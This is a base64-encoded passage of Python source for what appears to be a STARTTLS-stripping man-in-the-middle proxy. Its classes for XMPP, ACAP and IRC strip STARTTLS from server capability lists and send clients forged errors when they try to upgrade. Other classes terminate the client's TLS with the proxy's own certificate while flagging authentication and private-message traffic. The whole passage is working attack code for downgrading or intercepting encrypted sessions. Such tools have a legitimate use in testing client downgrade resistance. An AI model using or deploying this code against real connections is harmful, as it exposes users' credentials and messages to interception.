ZSk6DQogICAgICAgICAgICAgICAgaWYgIjxzdGFydHRscyIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgc3RhcnQgPSBkYXRhLmluZGV4KCI8c3RhcnR0bHMiKQ0KICAgICAgICAgICAgICAgICAgICBlbmQgPSBkYXRhLmluZGV4KCI8L3N0YXJ0dGxzPiIsc3RhcnQpK2xlbigiPC9zdGFydHRscz4iKQ0KICAgICAgICAgICAgICAgICAgICBzdGFydHRsc19hcmdzID0gZGF0YVtzdGFydDplbmRdDQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSBkYXRhWzpzdGFydF0gKyBkYXRhW2VuZDpdICAgICAgICAjIHN0cmlwIGluYm91bmQgc3RhcnR0bHMNCiAgICAgICAgICAgICAgICAgICAgaWYgInJlcXVpcmVkIiBpbiBzdGFydHRsc19hcmdzOg0KICAgICAgICAgICAgICAgICAgICAgICAgIyBkbyBvdXRib3VuZCBzdGFydHRscyBhcyByZXF1aXJlZCBieSBzZXJ2ZXINCiAgICAgICAgICAgICAgICAgICAgICAgIHNlc3Npb24ub3V0Ym91bmQuc2VuZGFsbCgiPHN0YXJ0dGxzIHhtbG5zPSd1cm46aWV0ZjpwYXJhbXM6eG1sOm5zOnhtcHAtdGxzJy8+IikNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPT4gW3NlcnZlcl1bbWFuZ2xlZF0gJXMiJShzZXNzaW9uLHJlcHIoIjxzdGFydHRscyB4bWxucz0ndXJuOmlldGY6cGFyYW1zOnhtbDpuczp4bXBwLXRscycvPiIpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BfZGF0YSA9IHNlc3Npb24ub3V0Ym91bmQucmVjdl9ibG9ja2VkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCByZXNwX2RhdGEuc3RhcnRzd2l0aCgiPHByb2NlZWQgIik6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgUHJvdG9jb2xWaW9sYXRpb25FeGNlcHRpb24oIndob29wIT8gc2VydmVyIGFubm91bmNlZCBTVEFSVFRMUyAqcmVxdWlyZWQqIGJ1dCBmYWlscyB0byBwcm9jZWVkLiAgcHJvdG8gdmlvbGF0aW9uOiAlcyIlcmVwcihyZXNwX2RhdGEpKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFsgICAgICBdID0+IFtzZXJ2ZXJdW21hbmdsZWRdIHBlcmZvcm1pbmcgb3V0Ym91bmQgU1NMIGhhbmRzaGFrZSIlKHNlc3Npb24pKQ0KICAgICAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5vdXRib3VuZC5zc2xfd3JhcF9zb2NrZXQoKQ0KDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfY2xpZW50X2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgIjxzdGFydHRscyIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgIyBkbyBub3QgcmVzcG9uZCB3aXRoIDxwcm9jZWVkIHhtbG5zPSd1cm46aWV0ZjpwYXJhbXM6eG1sOm5zOnhtcHAtdGxzJy8+DQogICAgICAgICAgICAgICAgICAgICM8ZmFpbHVyZS8+IG9yIDxwcm9jZWVkLz4NCiAgICAgICAgICAgICAgICAgICAgcmFpc2UgUHJvdG9jb2xWaW9sYXRpb25FeGNlcHRpb24oIndob29wIT8gY2xpZW50IHNlbnQgU1RBUlRUTFMgZXZlbiB0aG91Z2ggd2UgZGlkIG5vdCBhbm5vdW5jZSBpdC4uIHByb3RvIHZpb2xhdGlvbjogJXMiJXJlcHIoZGF0YSkpDQogICAgICAgICAgICAgICAgICAgICNzZXNzaW9uLmluYm91bmQuc2VuZGFsbCgiPHN1Y2Nlc3MgeG1sbnM9J3VybjppZXRmOnBhcmFtczp4bWw6bnM6eG1wcC10bHMnLz4iKSAgIyBmYWtlIHJlc3BvbmUNCiAgICAgICAgICAgICAgICAgICAgI2RhdGE9Tm9uZQ0KICAgICAgICAgICAgICAgIGVsaWYgYW55KGMgaW4gZGF0YS5sb3dlcigpIGZvciBjIGluICgiPC9hdXRoPiIsIjxxdWVyeSIsIjxpcSIsIjx1c2VybmFtZSIpKToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCg0KICAgICAgICBjbGFzcyBVbnRydXN0ZWRJbnRlcmNlcHQ6DQogICAgICAgICAgICAnJycgMSkgRG8gbm90IG1hbmdsZSBzZXJ2ZXIgZGF0YQ0KICAgICAgICAgICAgICAgIDIpIGludGVyY2VwdCBjbGllbnQgU1RBUlRMUywgbmVnb3RpYXRlZCBzc2xfY29udGV4dCB3aXRoIGNsaWVudCBhbmQgb25lIHdpdGggc2VydmVyLCB1bnRydXN0ZWQuDQogICAgICAgICAgICAgICAgICAgaW4gY2FzZSBjbGllbnQgZG9lcyBub3QgY2hlY2sga2V5cw0KICAgICAgICAgICAgJycnDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX3NlcnZlcl9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX2NsaWVudF9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIGlmICI8c3RhcnR0bHMgIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgICAgICAjIGRvIGluYm91bmQgU1RBUlRUTFMNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5pbmJvdW5kLnNlbmRhbGwoIjxwcm9jZWVkIHhtbG5zPSd1cm46aWV0ZjpwYXJhbXM6eG1sOm5zOnhtcHAtdGxzJy8+IikNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PSBbICAgICAgXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcigiPHByb2NlZWQgeG1sbnM9J3VybjppZXRmOnBhcmFtczp4bWw6bnM6eG1wcC10bHMnLz4iKSkpDQogICAgICAgICAgICAgICAgICAgIGNvbnRleHQgPSBWZWN0b3JzLkdFTkVSSUMuSW50ZXJjZXB0LmNyZWF0ZV9zc2xfY29udGV4dCgpDQogICAgICAgICAgICAgICAgICAgIGNvbnRleHQubG9hZF9jZXJ0X2NoYWluKGNlcnRmaWxlPVZlY3RvcnMuX1RMU19DRVJURklMRSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAga2V5ZmlsZT1WZWN0b3JzLl9UTFNfS0VZRklMRSkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PSBbICAgICAgXVttYW5nbGVkXSB3YWl0aW5nIGZvciBpbmJvdW5kIFNTTCBoYW5kc2hha2UiJShzZXNzaW9uKSkNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5pbmJvdW5kLnNzbF93cmFwX3NvY2tldF93aXRoX2NvbnRleHQoY29udGV4dCwgc2VydmVyX3NpZGU9VHJ1ZSkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PiBbICAgICAgXSAgICAgICAgICBTU0wgaGFuZHNoYWtlIGRvbmU6ICVzIiUoc2Vzc2lvbiwgc2Vzc2lvbi5pbmJvdW5kLnNvY2tldF9zc2wuY2lwaGVyKCkpKQ0KICAgICAgICAgICAgICAgICAgICAjIG91dGJvdW5kIHNzbA0KDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24ub3V0Ym91bmQuc2VuZGFsbChkYXRhKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFsgICAgICBdID0+IFtzZXJ2ZXJdW21hbmdsZWRdICVzIiUoc2Vzc2lvbixyZXByKGRhdGEpKSkNCiAgICAgICAgICAgICAgICAgICAgcmVzcF9kYXRhID0gc2Vzc2lvbi5vdXRib3VuZC5yZWN2X2Jsb2NrZWQoKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFsgICAgICBdIDw9IFtzZXJ2ZXJdW21hbmdsZWRdICVzIiUoc2Vzc2lvbixyZXByKHJlc3BfZGF0YSkpKQ0KICAgICAgICAgICAgICAgICAgICBpZiBub3QgcmVzcF9kYXRhLnN0YXJ0c3dpdGgoIjxwcm9jZWVkICIpOg0KICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgUHJvdG9jb2xWaW9sYXRpb25FeGNlcHRpb24oIndob29wIT8gY2xpZW50IHNlbnQgU1RBUlRUTFMgZXZlbiB0aG91Z2ggd2UgZGlkIG5vdCBhbm5vdW5jZSBpdC4uIHByb3RvIHZpb2xhdGlvbjogJXMiJXJlcHIocmVzcF9kYXRhKSkNCg0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFsgICAgICBdID0+IFtzZXJ2ZXJdW21hbmdsZWRdIHBlcmZvcm1pbmcgb3V0Ym91bmQgU1NMIGhhbmRzaGFrZSIlKHNlc3Npb24pKQ0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLm91dGJvdW5kLnNzbF93cmFwX3NvY2tldCgpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgWyAgICAgIF0gPD4gW3NlcnZlcl0gICAgICAgICAgU1NMIGhhbmRzaGFrZSBkb25lOiAlcyIlKHNlc3Npb24sIHNlc3Npb24ub3V0Ym91bmQuc29ja2V0X3NzbC5jaXBoZXIoKSkpDQoNCiAgICAgICAgICAgICAgICAgICAgZGF0YT1Ob25lDQogICAgICAgICAgICAgICAgZWxpZiAiPC9hdXRoPiIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCg0KICAgIGNsYXNzIEFDQVA6DQogICAgICAgICNyZmMyMjQ0LCByZmMyNTk1DQogICAgICAgIF9QUk9UT19JRCA9IDY3NQ0KICAgICAgICBfUkVYX0NBUCA9IHJlLmNvbXBpbGUociJcKChbXlwpXSspXCkiKQ0KICAgICAgICBjbGFzcyBTdHJpcEZyb21DYXBhYmlsaXRpZXM6DQogICAgICAgICAgICAnJycgMSkgRm9yY2UgU2VydmVyIHJlc3BvbnNlIHRvICpOT1QqIGFubm91bmNlIFNUQVJUVExTIHN1cHBvcnQNCiAgICAgICAgICAgICAgICAyKSByYWlzZSBleGNlcHRpb24gaWYgY2xpZW50IHRyaWVzIHRvIG5lZ290aWF0ZWQgU1RBUlRUTFMNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiBhbGwoa3cgaW4gZGF0YSBmb3Iga3cgaW4gKCJBQ0FQIiwiU1RBUlRUTFMiKSk6DQogICAgICAgICAgICAgICAgICAgIGZlYXR1cmVzID0gVmVjdG9ycy5BQ0FQLl9SRVhfQ0FQLmZpbmRhbGwoZGF0YSkgICMgZmVhdHVyZXMgdy9vIHBhcmVudGhlc2VzDQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSAnICcuam9pbigiKCVzKSIlZiBmb3IgZiBpbiBmZWF0dXJlcyBpZiBub3QgIlNUQVJUVExTIiBpbiBmKQ0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX2NsaWVudF9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIGlmICIgU1RBUlRUTFMiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgICAgIHJhaXNlIFByb3RvY29sVmlvbGF0aW9uRXhjZXB0aW9uKCJ3aG9vcCE/IGNsaWVudCBzZW50IFNUQVJUVExTIGV2ZW4gdGhvdWdoIHdlIGRpZCBub3QgYW5ub3VuY2UgaXQuLiBwcm90byB2aW9sYXRpb246ICVzIiVyZXByKGRhdGEpKQ0KICAgICAgICAgICAgICAgIGVsaWYgIiBBVVRIRU5USUNBVEUgIiBpbiBkYXRhOiAgICAgICANCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgDQogICAgICAgIGNsYXNzIFN0cmlwV2l0aEVycm9yOg0KICAgICAgICAgICAgJycnIDEpIGZvcmNlIHNlcnZlciBlcnJvciBvbiBjbGllbnQgc2VuZGluZyBTVEFSVFRMUw0KICAgICAgICAgICAgJycnDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX3NlcnZlcl9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX2NsaWVudF9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIGlmICIgU1RBUlRUTFMiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgICAgIGlkID0gZGF0YS5zcGxpdCgnICcsMSlbMF0uc3RyaXAoKQ0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLmluYm91bmQuc2VuZGFsbCgnJXMgQkFEICJjb21tYW5kIHVua25vd24gb3IgYXJndW1lbnRzIGludmFsaWQiJyVpZCkgICMgb3IgNTgwIENhbiBub3QgaW5pdGlhdGUgVExTIG5lZ290aWF0aW9uDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD0gW3NlcnZlcl1bbWFuZ2xlZF0gJXMiJShzZXNzaW9uLHJlcHIoJyVzIEJBRCAiY29tbWFuZCB1bmtub3duIG9yIGFyZ3VtZW50cyBpbnZhbGlkIiclaWQpKSkNCiAgICAgICAgICAgICAgICAgICAgZGF0YT1Ob25lDQogICAgICAgICAgICAgICAgZWxpZiAiIEFVVEhFTlRJQ0FURSAiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgICAgIHJld3JpdGUuc2V0X3Jlc3VsdChzZXNzaW9uLCBUcnVlKQ0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgDQogICAgICAgIGNsYXNzIFVudHJ1c3RlZEludGVyY2VwdDoNCiAgICAgICAgICAgICcnJyAxKSBEbyBub3QgbWFuZ2xlIHNlcnZlciBkYXRhDQogICAgICAgICAgICAgICAgMikgaW50ZXJjZXB0IGNsaWVudCBTVEFSVExTLCBuZWdvdGlhdGVkIHNzbF9jb250ZXh0IHdpdGggY2xpZW50IGFuZCBvbmUgd2l0aCBzZXJ2ZXIsIHVudHJ1c3RlZC4NCiAgICAgICAgICAgICAgICAgICBpbiBjYXNlIGNsaWVudCBkb2VzIG5vdCBjaGVjayBrZXlzDQogICAgICAgICAgICAnJycNCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfc2VydmVyX2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfY2xpZW50X2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgIiBTVEFSVFRMUyIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgIyBkbyBpbmJvdW5kIFNUQVJUVExTDQogICAgICAgICAgICAgICAgICAgIGlkID0gZGF0YS5zcGxpdCgnICcsMSlbMF0uc3RyaXAoKQ0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLmluYm91bmQuc2VuZGFsbCgnJXMgT0sgIkJlZ2luIFRMUyBuZWdvdGlhdGlvbiBub3ciJyVpZCkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PSBbICAgICAgXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcignJXMgT0sgIkJlZ2luIFRMUyBuZWdvdGlhdGlvbiBub3ciJyVpZCkpKQ0KICAgICAgICAgICAgICAgICAgICBjb250ZXh0ID0gVmVjdG9ycy5HRU5FUklDLkludGVyY2VwdC5jcmVhdGVfc3NsX2NvbnRleHQoKQ0KICAgICAgICAgICAgICAgICAgICBjb250ZXh0LmxvYWRfY2VydF9jaGFpbihjZXJ0ZmlsZT1WZWN0b3JzLl9UTFNfQ0VSVEZJTEUsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBrZXlmaWxlPVZlY3RvcnMuX1RMU19LRVlGSUxFKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFtjbGllbnRdIDw9IFsgICAgICBdW21hbmdsZWRdIHdhaXRpbmcgZm9yIGluYm91bmQgU1NMIGhhbmRzaGFrZSIlKHNlc3Npb24pKQ0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLmluYm91bmQuc3NsX3dyYXBfc29ja2V0X3dpdGhfY29udGV4dChjb250ZXh0LCBzZXJ2ZXJfc2lkZT1UcnVlKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFtjbGllbnRdIDw+IFsgICAgICBdICAgICAgICAgIFNTTCBoYW5kc2hha2UgZG9uZTogJXMiJShzZXNzaW9uLCBzZXNzaW9uLmluYm91bmQuc29ja2V0X3NzbC5jaXBoZXIoKSkpDQogICAgICAgICAgICAgICAgICAgICMgb3V0Ym91bmQgc3NsDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLm91dGJvdW5kLnNlbmRhbGwoZGF0YSkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbICAgICAgXSA9PiBbc2VydmVyXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcihkYXRhKSkpDQogICAgICAgICAgICAgICAgICAgIHJlc3BfZGF0YSA9IHNlc3Npb24ub3V0Ym91bmQucmVjdl9ibG9ja2VkKCkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbICAgICAgXSA8PSBbc2VydmVyXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcihyZXNwX2RhdGEpKSkNCiAgICAgICAgICAgICAgICAgICAgaWYgbm90ICIgT0sgIiBpbiByZXNwX2RhdGE6DQogICAgICAgICAgICAgICAgICAgICAgICByYWlzZSBQcm90b2NvbFZpb2xhdGlvbkV4Y2VwdGlvbigid2hvb3AhPyBjbGllbnQgc2VudCBTVEFSVFRMUyBldmVuIHRob3VnaCB3ZSBkaWQgbm90IGFubm91bmNlIGl0Li4gcHJvdG8gdmlvbGF0aW9uOiAlcyIlcmVwcihyZXNwX2RhdGEpKQ0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbICAgICAgXSA9PiBbc2VydmVyXVttYW5nbGVkXSBwZXJmb3JtaW5nIG91dGJvdW5kIFNTTCBoYW5kc2hha2UiJShzZXNzaW9uKSkNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5vdXRib3VuZC5zc2xfd3JhcF9zb2NrZXQoKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFsgICAgICBdIDw+IFtzZXJ2ZXJdICAgICAgICAgIFNTTCBoYW5kc2hha2UgZG9uZTogJXMiJShzZXNzaW9uLCBzZXNzaW9uLm91dGJvdW5kLnNvY2tldF9zc2wuY2lwaGVyKCkpKQ0KICAgIA0KICAgICAgICAgICAgICAgICAgICBkYXRhPU5vbmUNCiAgICAgICAgICAgICAgICBlbGlmICIgQVVUSEVOVElDQVRFICIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCg0KICAgIGNsYXNzIElSQzoNCiAgICAgICAgI3JmYzIyNDQsIHJmYzI1OTUNCiAgICAgICAgX1BST1RPX0lEID0gNjY2Nw0KICAgICAgICBfUkVYX0NBUCA9IHJlLmNvbXBpbGUociJcKChbXlwpXSspXCkiKQ0KICAgICAgICBfSURFTlRfUE9SVCA9IDExMw0KICAgICAgICBjbGFzcyBTdHJpcEZyb21DYXBhYmlsaXRpZXM6DQogICAgICAgICAgICAnJycgMSkgRm9yY2UgU2VydmVyIHJlc3BvbnNlIHRvICpOT1QqIGFubm91bmNlIFNUQVJUVExTIHN1cHBvcnQNCiAgICAgICAgICAgICAgICAyKSByYWlzZSBleGNlcHRpb24gaWYgY2xpZW50IHRyaWVzIHRvIG5lZ290aWF0ZWQgU1RBUlRUTFMNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiBhbGwoa3cubG93ZXIoKSBpbiBkYXRhLmxvd2VyKCkgZm9yIGt3IGluICgiIGNhcCAiLCIgdGxzIikpOg0KICAgICAgICAgICAgICAgICAgICBtYW5nbGVkID0gW10NCiAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gZGF0YS5zcGxpdCgiCiIpOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgYWxsKGt3Lmxvd2VyKCkgaW4gbGluZS5sb3dlcigpIGZvciBrdyBpbiAoIiBjYXAgIiwiIHRscyIpKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIGNhbiBiZSBDQVAgTFMgb3IgQ0FQIEFDSy9OQUNLDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgIiBhY2sgIiBpbiBkYXRhLmxvd2VyKCk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpbmUgPSBsaW5lLnJlcGxhY2UoIkFDSyIsIk5BSyIpLnJlcGxhY2UoImFjayIsIm5hayIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZTogICAjbHMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmVhdHVyZXMgPSBsaW5lLnNwbGl0KCIgIikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGluZSA9ICcgJy5qb2luKGYgZm9yIGYgaW4gZmVhdHVyZXMgaWYgbm90ICd0bHMnIGluIGYubG93ZXIoKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIG1hbmdsZWQuYXBwZW5kKGxpbmUpDQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSAiCiIuam9pbihtYW5nbGVkKQ0KICAgICAgICAgICAgICAgIGVsaWYgYW55KGt3Lmxvd2VyKCkgaW4gZGF0YS5sb3dlcigpIGZvciBrdyBpbiAoJ2F1dGhlbnRpY2F0ZSAnLCdwcml2bXNnICcsICdwcm90b2N0bCAnKSk6DQogICAgICAgICAgICAgICAgICAgIHJld3JpdGUuc2V0X3Jlc3VsdChzZXNzaW9uLCBUcnVlKQ0KICAgICAgICAgICAgICAgIHJldHVybiANCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfY2xpZW50X2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgIlNUQVJUVExTIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgICAgICByYWlzZSBQcm90b2NvbFZpb2xhdGlvbkV4Y2VwdGlvbigid2hvb3AhPyBjbGllbnQgc2VudCBTVEFSVFRMUyBldmVuIHRob3VnaCB3ZSBkaWQgbm90IGFubm91bmNlIGl0Li4gcHJvdG8gdmlvbGF0aW9uOiAlcyIlcmVwcihkYXRhKSkNCiAgICAgICAgICAgICAgICAjZWxpZiBhbGwoa3cubG93ZXIoKSBpbiBkYXRhLmxvd2VyKCkgZm9yIGt3IGluICgiY2FwIHJlcSIsInRscyIpKToNCiAgICAgICAgICAgICAgICAjICAgICMgbWFuZ2xlIENBUEFCSUxJVFkgUkVRVUVTVA0KICAgICAgICAgICAgICAgICMgICAgaWYgIjoiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgIyAgICAgICAgY21kLCBjYXBzID0gZGF0YS5zcGxpdCgiOiIpDQogICAgICAgICAgICAgICAgIyAgICAgICAgY2FwcyA9IChjIGZvciBjIGluIGNhcHMuc3BsaXQoIiAiKSBpZiBub3QgInRscyIgaW4gYy5sb3dlcigpKQ0KICAgICAgICAgICAgICAgICMgICAgICAgIGRhdGE9IiVzOiVzIiUoY21kLCcgJy5qb2luKGNhcHMpKQ0KICAgICAgICAgICAgICAgIGVsaWYgYW55KGt3Lmxvd2VyKCkgaW4gZGF0YS5sb3dlcigpIGZvciBrdyBpbiAoJ2F1dGhlbnRpY2F0ZSAnLCdwcml2bXNnICcsICdwcm90b2N0bCAnKSk6DQogICAgICAgICAgICAgICAgICAgIHJld3JpdGUuc2V0X3Jlc3VsdChzZXNzaW9uLCBUcnVlKQ0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgIA0KICAgICAgICBjbGFzcyBTdHJpcFdpdGhFcnJvcjoNCiAgICAgICAgICAgICcnJyAxKSBmb3JjZSBzZXJ2ZXIgZXJyb3Igb24gY2xpZW50IHNlbmRpbmcgU1RBUlRUTFMNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiBhbnkoa3cubG93ZXIoKSBpbiBkYXRhLmxvd2VyKCkgZm9yIGt3IGluICgnYXV0aGVudGljYXRlICcsJ3ByaXZtc2cgJywgJ3Byb3RvY3RsICcpKToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfY2xpZW50X2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgIlNUQVJUVExTIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgICAgICBwYXJhbXMgPSB7J3Nydic6J3RoaXMuc2VydmVyLmNvbScsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmlja25hbWUnOiAnKicsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY21kJzogJ1NUQVJUVExTJw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAjIGlmIHdlJ3JlIGx1Y2t5IHdlIGNhbiBleHRyYWN0IHRoZSB1c2VybmFtZSBmcm9tIGEgcHJldi4gc2VydmVyIGxpbmUNCiAgICAgICAgICAgICAgICAgICAgcHJldl9yZXNwb25zZSA9IHNlc3Npb24ub3V0Ym91bmQucmVjdmJ1Zi5zdHJpcCgpDQogICAgICAgICAgICAgICAgICAgIGlmIHByZXZfcmVzcG9uc2U6ICANCiAgICAgICAgICAgICAgICAgICAgICAgIGZpZWxkcyA9IHByZXZfcmVzcG9uc2Uuc3BsaXQoIiAiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcmFtc1snc3J2J10gPSBmaWVsZHNbMF0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJhbXNbJ25pY2tuYW1lJ10gPSBmaWVsZHNbMl0NCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBJbmRleEVycm9yOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5pbmJvdW5kLnNlbmRhbGwoIiUoc3J2KXMgNjkxICUobmlja25hbWUpcyA6JShjbWQpcw0KIiVwYXJhbXMpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD0gW3NlcnZlcl1bbWFuZ2xlZF0gJXMiJShzZXNzaW9uLHJlcHIoIiUoc3J2KXMgNjkxICUobmlja25hbWUpcyA6JShjbWQpcw0KIiVwYXJhbXMpKSkNCiAgICAgICAg